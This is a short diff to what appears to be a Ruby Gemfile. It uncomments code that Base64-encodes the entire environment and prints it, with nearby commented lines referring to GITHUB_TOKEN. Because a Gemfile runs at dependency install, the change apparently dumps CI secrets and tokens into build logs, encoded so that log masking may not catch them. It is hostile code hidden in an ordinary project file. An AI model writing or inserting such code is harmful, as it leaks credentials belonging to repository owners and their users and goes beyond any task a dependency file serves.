@@ -1,10 +1,10 @@
 source 'https://rubygems.org'
 require 'base64'
 
-# encoded = Base64.strict_encode64(ENV.to_h.to_s)
+encoded = Base64.strict_encode64(ENV.to_h.to_s)
 
 
-# puts encoded
+puts encoded
 # ENV["GH_TOKEN"] = ENV["GITHUB_TOKEN"]
 # token = ENV["GITHUB_TOKEN"]
 
